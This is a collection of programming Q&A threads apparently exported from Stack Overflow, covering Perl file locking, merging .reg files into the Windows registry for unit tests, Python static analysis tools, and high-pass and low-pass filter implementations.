 <p>Have you considered using the <a href=""http://search.cpan.org/perldoc?LockFile::Simple"" rel=""nofollow"">LockFile::Simple  module</a>? It does most of the work for you already.</p>

<p>In my past experience, I have found it very easy to use and sturdy.</p>
 <p>I think it would be much better to show this with lexical variables as file handlers
and error handling.
It is also better to use the constants from the Fcntl module than hard code the magic number 2 which might not be the right number on all operating systems.</p>

<pre>
    use Fcntl ':flock'; # import LOCK_* constants

    # open the file for appending
    open (my $fh, '>>', 'test.dat') or die $!;

    # try to lock the file exclusively, will wait till you get the lock
    flock($fh, LOCK_EX);

    # do something with the file here (print to it in our case)

    # actually you should not unlock the file
    # close the file will unlock it
    close($fh) or warn ""Could not close file $!"";
</pre>

<p>Check out the full <a href=""http://perldoc.perl.org/functions/flock.html"">documentation of flock</a> and the <a href=""http://www.perlmonks.org/?node_id=7058"">File locking tutorial</a> on PerlMonks even though that also uses the old style of file handle usage.</p>

<p>Actually I usually skip the error handling on close() as there is not
much I can do if it fails anyway.</p>

<p>Regarding what to lock, if you are working in a single file then lock that file. If you need to lock several files at once then - in order to avoid dead locks - it is better to pick one file that you are locking. Does not really matter if that is one of the several files you really need to lock or a separate file you create just for the locking purpose.</p>
 <p>Ryan P <a href=""#79295"" rel=""nofollow"">wrote</a>:</p>

<blockquote>
  <p>In this case the file is actually unlocked for a short period of time while the file is reopened.</p>
</blockquote>

<p>So don’t do that. Instead, <code>open</code> the file for read/write:</p>

<pre><code>open my $fh, '+&lt;', 'test.dat'
    or die ""Couldn’t open test.dat: $!\n"";
</code></pre>

<p>When you are ready to write the counter, just <code>seek</code> back to the start of the file. Note that if you do that, you should <code>truncate</code> just before <code>close</code>, so that the file isn’t left with trailing garbage if its new contents are shorter than its previous ones. (Usually, the current position in the file is at its end, so you can just write <code>truncate $fh, tell $fh</code>.)</p>

<p>Also, note that I used three-argument <code>open</code> and a lexical file handle, and I also checked the success of the operation. Please avoid global file handles (global variables are bad, mmkay?) and magic two-argument <code>open</code> (which has been a source of many a(n exploitable) bug in Perl code), and always test whether your <code>open</code>s succeed.</p>
 <pre><code>use strict;

use Fcntl ':flock'; # Import LOCK_* constants

# We will use this file path in error messages and function calls.
# Don't type it out more than once in your code.  Use a variable.
my $file = '/path/to/some/file';

# Open the file for appending.  Note the file path is in quoted
# in the error message.  This helps debug situations where you
# have a stray space at the start or end of the path.
open(my $fh, '&gt;&gt;', $file) or die ""Could not open '$file' - $!"";

# Get exclusive lock (will block until it does)
flock($fh, LOCK_EX);


# Do something with the file here...


# Do NOT use flock() to unlock the file if you wrote to the
# file in the ""do something"" section above.  This could create
# a race condition.  The close() call below will unlock it
# for you, but only after writing any buffered data.

# In a world of buffered i/o, some or all of your data will not 
# be written until close() completes.  Always, always, ALWAYS 
# check the return value on close()!
close($fh) or die ""Could not write '$file' - $!"";
</code></pre>
 <p>Here's my solution to reading and writing in one lock...</p>

<pre><code>open (TST,""+&lt; readwrite_test.txt"") or die ""Cannot open file\n$!"";
flock(TST, LOCK_EX);
# Read the file:
@LINES=&lt;TST&gt;;
# Wipe the file:
seek(TST, 0, 0); truncate(TST, 0);
# Do something with the contents here:
push @LINES,""grappig, he!\n"";
$LINES[3]=""Gekke henkie!\n"";
# Write the file:
foreach $l (@LINES)
{
   print TST $l;
}
close(TST) or die ""Cannot close file\n$!"";
</code></pre>
 <p>The other answers cover Perl flock locking pretty well, but on many Unix/Linux systems there are actually two independent locking systems: BSD flock() and POSIX fcntl()-based locks.</p>

<p>Unless you provide special options to configure when building Perl, its flock will use flock() if available.  This is generally fine and probably what you want if you just need locking within your application (running on a single system).  However, sometimes you need to interact with another application that uses fcntl() locks (like Sendmail, on many systems) or perhaps you need to do file locking across NFS-mounted filesystems.</p>

<p>In those cases, you might want to look at <a href=""http://search.cpan.org/~jtt/File-FcntlLock-0.12/lib/File/FcntlLock.pm"">File::FcntlLock</a> or <a href=""http://search.cpan.org/~phenson/File-Lockf-0.20/lockf.pm"">File::lockf</a>.  It is also possible to do fcntl()-based locking in pure Perl (with some hairy and non-portable bits of pack()).</p>

<p>Quick overview of flock/fcntl/lockf differences:</p>

<p>lockf is almost always implemented on top of fcntl, has file-level locking only.  If implemented using fcntl, limitations below also apply to lockf.</p>

<p>fcntl provides range-level locking (within a file) and network locking over NFS, but locks are not inherited by child processes after a fork().  On many systems, you must have the filehandle open read-only to request a shared lock, and read-write to request an exclusive lock.</p>

<p>flock has file-level locking only, locking is only within a single machine (you can lock an NFS-mounted file, but only local processes will see the lock).  Locks are inherited by children (assuming that the file descriptor is not closed).</p>

<p>Sometimes (SYSV systems) flock is emulated using lockf, or fcntl; on some BSD systems lockf is emulated using flock.  Generally these sorts of emulation work poorly and you are well advised to avoid them.</p>
 <p>Developed off of <a href=""http://metacpan.org/pod/File%3a%3aFcntlLock"" rel=""nofollow"">http://metacpan.org/pod/File::FcntlLock</a></p>

<pre><code>use Fcntl qw(:DEFAULT :flock :seek :Fcompat);
use File::FcntlLock;
sub acquire_lock {
  my $fn = shift;
  my $justPrint = shift || 0;
  confess ""Too many args"" if defined shift;
  confess ""Not enough args"" if !defined $justPrint;

  my $rv = TRUE;
  my $fh;
  sysopen($fh, $fn, O_RDWR | O_CREAT) or LOGDIE ""failed to open: $fn: $!"";
  $fh-&gt;autoflush(1);
  ALWAYS ""acquiring lock: $fn"";
  my $fs = new File::FcntlLock;
  $fs-&gt;l_type( F_WRLCK );
  $fs-&gt;l_whence( SEEK_SET );
  $fs-&gt;l_start( 0 );
  $fs-&gt;lock( $fh, F_SETLKW ) or LOGDIE  ""failed to get write lock: $fn:"" . $fs-&gt;error;
  my $num = &lt;$fh&gt; || 0;
  return ($fh, $num);
}

sub release_lock {
  my $fn = shift;
  my $fh = shift;
  my $num = shift;
  my $justPrint = shift || 0;

  seek($fh, 0, SEEK_SET) or LOGDIE ""seek failed: $fn: $!"";
  print $fh ""$num\n"" or LOGDIE ""write failed: $fn: $!"";
  truncate($fh, tell($fh)) or LOGDIE ""truncate failed: $fn: $!"";
  my $fs = new File::FcntlLock;
  $fs-&gt;l_type(F_UNLCK);
  ALWAYS ""releasing lock: $fn"";
  $fs-&gt;lock( $fh, F_SETLK ) or LOGDIE ""unlock failed: $fn: "" . $fs-&gt;error;
  close($fh) or LOGDIE ""close failed: $fn: $!"";
}
</code></pre>
 <p>One alternative to the lock <em>file</em> approach is to use a lock <em>socket</em>. See <a href=""http://metacpan.org/pod/Lock::Socket"" rel=""nofollow"">Lock::Socket</a> on CPAN for such an implementation. Usage is as simple as the following:</p>

<pre><code>use Lock::Socket qw/lock_socket/;
my $lock = lock_socket(5197); # raises exception if lock already taken
</code></pre>

<p>There are a couple of advantages to using a socket:</p>

<ul>
<li>guaranteed (through the operating system) that no two applications will hold the same lock: there is no race condition.</li>
<li>guaranteed (again through the operating system) to clean up neatly when your process exits, so there are no stale locks to deal with.</li>
<li>relies on functionality that is well supported by anything that Perl runs on: no issues with flock(2) support on Win32 for example.</li>
</ul>

<p>The obvious disadvantage is of course that the lock namespace is global. It is possible for a kind of denial-of-service if another process decides to lock the port you need.</p>

<p>[disclosure: I am the author of the afor-mentioned module]</p>
"
"programmatically merge .reg file into win32 registry <p>What's the best way to programmatically merge a .reg file into the registry? This is for unit testing; the .reg file is a test artifact which will be added then removed at the start and end of testing.</p>

<p>Or, if there's a better way to unit test against the registry...</p>
 <p>I looked into it by checking out my file associations.</p>

<p>It seems that a .reg file is just called as the first parameter to the <code>regedit.exe</code> executable on Windows. </p>

<p>So you can just say <code>regedit.exe ""mytest.reg""</code>. What I'm not sure of is how to get rid of the dialog box that pops up that asks for your confirmation.</p>
 <p>Use the Win32 API function ShellExecute() or ShellExecuteEx(). If the comment is 'open' it should merge the .reg file. I haven't tested it, but it should work.</p>
 <p>yeah, thought of both of those.... but then how do you remove the entries? I don't think regedit command line provides that functionality.</p>

<p>I think I'm going to go with the approach of just adding the keys via the usual registry API's, then remove them the same way.</p>

<p>Unless some better way comes along.</p>
 <p>It is possible to remove registry keys using a .reg file, although I'm not sure how well it's documented.  Here's how:</p>

<pre><code>REGEDIT4

[-HKEY_CURRENT_USER\Software\&lt;otherpath&gt;]
</code></pre>

<p>The <code>-</code> in front of the key name tells <code>Regedit</code> that you want to remove the key.</p>

<p>To run this silently, type:</p>

<pre><code>regedit /s ""myfile.reg""
</code></pre>
 <p>One of the most frustrating things about writing unit tests is dealing with dependencies.  One of the greatest things about Test-Driven Development is that it produces code that is decoupled from its dependencies.  Cool, huh?</p>

<p>When I find myself asking questions like this one, I look for ways to decouple the code I'm writing from the dependency.  Separate out the reading of the registry from the complexity that you'd like to test.</p>
 <p>If you're shelling out, I'd use the reg command (details below). If you can tell us what language you're working with, we could provide language specific code.</p>

<p>C:>reg /?</p>

<p>REG Operation [Parameter List]</p>

<p>Operation  [ QUERY   | ADD    | DELETE  | COPY    |
               SAVE    | LOAD   | UNLOAD  | RESTORE |
               COMPARE | EXPORT | IMPORT  | FLAGS ]</p>

<p>Return Code: (Except for REG COMPARE)</p>

<p>0 - Successful
  1 - Failed</p>

<p>For help on a specific operation type:</p>

<p>REG ADD /?
  REG DELETE /?
[snipped]</p>
"
"Are there static analysis tools for Python? <p>I am starting to use Python (specifically because of Django) and I would like to remove the burden for exhaustive testing by performing some static analysis.  What tools/parameters/etc. exist to detect issues at compile time that would otherwise show up during runtime? (type errors are probably the most obvious case of this, but undefined variables are another big one that could be avoided with an in-depth analysis of the AST.)</p>

<p>Obviously testing is important, and I don't imply that tests can be obviated entirely; however, there are many runtime errors in python that are not possible in other languages that perform stricter run-time checking -- I'm hoping that there are tools to bring at least some of these capabilities to python as well.</p>
 <p>There's</p>

<ul>
<li><a href=""http://www.logilab.org/857"">pylint</a></li>
<li><a href=""http://pychecker.sourceforge.net/"">pychecker</a></li>
<li><a href=""http://divmod.org/trac/wiki/DivmodPyflakes"">pyflakes</a></li>
</ul>

<p>And probably others, too.</p>
 <p><a href=""http://www.logilab.org/857"">pylint</a> is the best such tool I've found. Due to Python's nature it's difficult to statically analyze it, but it will catch undefined variables, basic type errors, unused code, etc. You'll want to tweak the configuration file, as by default it outputs many warnings I consider useless or harmful.</p>

<p>Here's part of my <code>.pylintrc</code> dealing with warning silencing:</p>

<pre><code>[MESSAGES CONTROL]

# Brain-dead errors regarding standard language features
#   W0142 = *args and **kwargs support
#   W0403 = Relative imports

# Pointless whinging
#   R0201 = Method could be a function
#   W0212 = Accessing protected attribute of client class
#   W0613 = Unused argument
#   W0232 = Class has no __init__ method
#   R0903 = Too few public methods
#   C0301 = Line too long
#   R0913 = Too many arguments
#   C0103 = Invalid name
#   R0914 = Too many local variables

# PyLint's module importation is unreliable
#   F0401 = Unable to import module
#   W0402 = Uses of a deprecated module

# Already an error when wildcard imports are used
#   W0614 = Unused import from wildcard

# Sometimes disabled depending on how bad a module is
#   C0111 = Missing docstring

# Disable the message(s) with the given id(s).
disable=W0142,W0403,R0201,W0212,W0613,W0232,R0903,W0614,C0111,C0301,R0913,C0103,F0401,W0402,R0914
</code></pre>
 <p>You should check out <a href=""http://divmod.org/trac/wiki/DivmodPyflakes"">Pyflakes</a>, <a href=""http://www.logilab.org/project/pylint"">Pylint</a>, and <a href=""http://pychecker.sourceforge.net/"">PyChecker</a>. I've personally used both Pyflakes and Pylint, and found them both to be very helpful for catching those little things you hate to mess up on. Pylint generally requires a bit more configuration than Pyflakes.</p>

<p>Also noteworthy: Eclipse's PyDev plugin comes in with a built in Pylint output parser.</p>
 <p>I echo the other answers and would just add that <a href=""http://pychecker.sourceforge.net/"" rel=""nofollow"">pychecker</a> is the quickest and easiest to use and <a href=""http://www.logilab.org/857"" rel=""nofollow"">pylint</a> the most comprehensive and configurable.</p>

<p>I also use <a href=""http://epydoc.sourceforge.net/"" rel=""nofollow"">epydoc</a> a fair bit and this is good for pointing out problems with your docstrings.</p>
 <p>Here are my first impressions of pyflakes, pychecker and pylint:</p>

<ul>
<li><p><strong>pychecker</strong>: It crashes frequently, most of the runs I tried resulted in Errors that originated in the pychecker code (eg: AttributeError or IndexError: list index out of range were the most common).  For some reason I had to set the DJANGO_SETTINGS_MODULE environment variable before it would even run on any of the app code, and the documentation is very sparse.</p></li>
<li><p><strong>pyflakes</strong>: 'pyflakes --help' throws a TypeError -- erm... Documentation is also very sparse, and pyflakes is very forgiving (as far as I can tell, it only reports compile errors, warnings, redefinitions, and some concerns about imports--such as unused and wildcards).  pyflakes also seems to repeat itself:</p>

<blockquote>
  <p>eventlist/views.py:4: 'Http404' imported but unused<br>
      eventlist/views.py:4: 'Http404' imported but unused<br>
      eventlist/views.py:5: 'from eventlist.models import *' used; unable to detect undefined names
      eventlist/views.py:59: 'authenticate' imported but unused<br>
      eventlist/views.py:61: redefinition of unused 'login' from
  line 59<br>
      eventlist/views.py:5: 'from eventlist.models import *' used;
  unable to detect undefined names <br>
     eventlist/views.py:4: 'Http404' imported but unused</p>
</blockquote></li>
<li><p><strong>pylint</strong>: This seems to be the most capable of the tools suggested.  It has the best documentation.  LogiLab provides a tutorial, pylint has a help screen, and there is a (broken) link to a user manual, which would be extremely helpful.  There are some issues with applying pylint to django, since pylint doesn't know about the django classes (such as models.Model).  This means that a fair number of otherwise valuable errors are generated about missing class fields.  eg:</p>

<blockquote>
  <p>E:105:get_events_by_tag: Class 'Tag' has no 'objects' member<br></p>
</blockquote>

<p>Parsing these out automatically will be very difficult without some additional knowledge of the classes in use.  I'm not sure adding that is feasible, but it does seem likely that pylint is capable of dealing with this in the ""right"" way.  (I probably just need to point it to the django source, but there are no command line params that look likely, and, as mentioned earlier, the user manual is inaccessible.)</p></li>
</ul>

<p>For the moment, I'm still looking into pylint -- pychecker and pyflakes need better documentation and they need to become more robust.</p>
 <p>See our <a href=""http://www.semanticdesigns.com/Products/Clone"" rel=""nofollow"">CloneDR</a>, a tool for detecting duplicated code in spite of formatting changes, comment insertion/deletions, and even some changes to the code itself (replacement of one statement by another).</p>

<p>CloneDR works for a wide variety of languages (C, C++, C#, COBOL, Java, PHP, ...).  We recently added Python 2.6, and Python 3.0 isn't far off.</p>
 <p>A great simple one that I use is <a href=""http://pypi.python.org/pypi/flake8"">Flake8</a> 
-  It combines PyFlakes and PEP8</p>
 <p><a href=""http://clonedigger.sourceforge.net/"" rel=""nofollow"">clonedigger</a> helps you identify code duplication.</p>

<p>Update: unfortunately clonedigger seems not to be maintained any longer. </p>
 <p><a href=""https://github.com/yinwang0/pysonar2"" rel=""nofollow"">PySonar2</a>, an advanced Python static analyzer came out of two summer's working at Google by Yin Wang. He recently open sourced it and I <a href=""https://github.com/ariejdl/pysonarsq"" rel=""nofollow"">ported it</a> from being implemented in Java to Python. All the important tests are passing.</p>
 <p>Another one is <a href=""http://blog.landscape.io/prospector-python-static-analysis-for-humans.html"">Prospector</a>. This tool bundles several of the other static analyzers together and provides sensible defaults. Here's the pitch that got me to try it out:</p>

<blockquote>
  <p>Chances are, you will consider most of the warnings that come from
  tools like pylint or pep8 or pyflakes to be a bit picky. There are
  warnings about line length, there are warnings about whitespace on
  empty lines, there are warnings about how much space there is between
  methods on your class. What you probably want, however, is a list of
  actual problems in your code.</p>
</blockquote>

<p>It's easy enough to use:</p>

<pre><code>$ pip install --user prospector
$ prospector

Check Information
=================
       Started: 2014-10-20 14:10:42.677376
      Finished: 2014-10-20 14:10:57.224805
    Time Taken: 14.55 seconds
     Formatter: text
    Strictness: medium
Libraries Used: 
     Tools Run: dodgy, frosted, mccabe, pep8, pyflakes, pylint
      Adaptors: common-plugin, profiles:strictness_medium,no_doc_warnings,no_test_warnings
 Message Found: 93
</code></pre>
"
"What Are High-Pass and Low-Pass Filters? <p>Graphics and audio editing and processing software often contain functions called ""High-Pass Filter"" and ""Low-Pass Filter"".  Exactly what do these do, and what are the algorithms for implementing them?</p>
 <p>Wikipedia:</p>

<ul>
<li><a href=""http://en.wikipedia.org/wiki/High-pass_filter"">High-pass filter</a></li>
<li><a href=""http://en.wikipedia.org/wiki/Low-pass_filter"">Low-pass filter</a></li>
<li><a href=""http://en.wikipedia.org/wiki/Band-pass_filter"">Band-pass filter</a></li>
</ul>

<p>These ""high"", ""low"", and ""band"" terms refer to <em>frequencies</em>. In high-pass, you try to remove low frequencies. In low-pass, you try to remove high. In band pass, you only allow a continuous frequency range to remain.</p>

<p>Choosing the cut-off frequency depends upon your application. Coding these filters can either be done by simulating RC circuits or by playing around with Fourier transforms of your time-based data. See the wikipedia articles for code examples.</p>
 <p>They are generally Electrical circuits that tend to pass parts of analog signals. High pass tends to transmit more of the high frequency parts and low pass tends to pass more of the low frequency parts.</p>

<p>They can be simulated in software. A walking average can act as a low pass filter for instance and the difference between a walking average and it's input can work as a high pass filter.</p>
 <p><strong>High-pass</strong> filter lets <em>high</em>-frequency (detailed/local information) <em>pass</em>.<br />
<strong>Low-pass</strong> filter lets <em>low</em>-frequency (coarse/rough/global information) <em>pass</em>.</p>
 <p>Here is how you implement a low-pass filter using convolution:</p>



<pre class=""lang-c prettyprint-override""><code>double[] signal = (some 1d signal);
double[] filter = [0.25 0.25 0.25 0.25]; // box-car filter
double[] result = new double[signal.Length + filter.Length + 1];

// Set result to zero:
for (int i=0; i &lt; result.Length; i++) result[i] = 0;

// Do convolution:
for (int i=0; i &lt; signal.Length; i++) 
  for (int j=0; j &lt; filter.Length; j++)
    result[i+j] = result[i+j] + signal[i] * filter[j];
</code></pre>

<p>Note that the example is extremely simplified. It does not do range checks and does not handle the edges properly. The filter used (box-car) is a particularly bad lowpass filter, because it will cause a lot of artifacts (ringing). Read up on filter design.</p>

<p>You can also implement the filters in the frequency domain. Here is how you implement a high-pass filter using FFT:</p>

<pre class=""lang-c prettyprint-override""><code>double[] signal = (some 1d signal);
// Do FFT:
double[] real;
double[] imag;
[real, imag] = fft(signal)

// Set the first quarter of the real part to zero to attenuate the low frequencies
for (int i=0; i &lt; real.Length / 4; i++) 
  real[i] = 0;

// Do inverse FFT:
double[] highfrequencysignal = inversefft(real, imag);
</code></pre>

<p>Again, this is simplified, but you get the idea. The code does not look as complicated as the math.</p>
 <p>Filtering describes the act of processing data in a way that applies different levels of attenuation to different frequencies within the data.</p>

<p>A high pass filter will apply minimal attentuation (ie. leave levels unchanged) for high frequencies, but applies maximum attenuation to low frequencies.</p>

<p>A low pass filter is the reverse - it will apply no attenuation to low frequencies by applies attenuation to high frequencies.</p>

<p>There are a number of different filtering algorithms that are used. The two simplest are probably the Finite Impulse Response filter (aka. FIR filter) and the Infinite Impulse Response filter (aka. IIR filter).</p>

<p>The FIR filter works by keeping a series of samples and multiplying each of those samples by a fixed coefficient (which is based on the position in the series). The results of each of these multiplications is accumulated and is the output for that sample. This is referred to as a Multiply-Accumulate - and in dedicated DSP hardware there is a specific MAC instruction for doing just this.</p>

<p>When the next sample is taken it's added to the start of the series, and the oldest sample in the series is removed, and the process repeated.</p>

<p>The behavior of the filter is fixed by the selection of the filter coefficients.</p>

<p>One of the simplest filters that is often provided by image processing software is the averaging filter. This can be implemented by an FIR filter by setting all of the filter coefficients to the same value.</p>
 <p>Here is a super simple example of a low pass filter in C++ that processes the signal one sample at a time:</p>



<pre class=""lang-cpp prettyprint-override""><code>float lopass(float input, float cutoff) {
 lo_pass_output= outputs[0]+ (cutoff*(input-outputs[0])); 
outputs[0]= lo_pass_output;
return(lo_pass_output);
}
</code></pre>

<p>Here is pretty much the same thing, except it's high pass:</p>

<pre class=""lang-cpp prettyprint-override""><code>float hipass(float input, float cutoff) {
 hi_pass_output=input-(outputs[0] + cutoff*(input-outputs[0]));
 outputs[0]=hi_pass_output;
 return(hi_pass_output);
}
</code></pre>
"
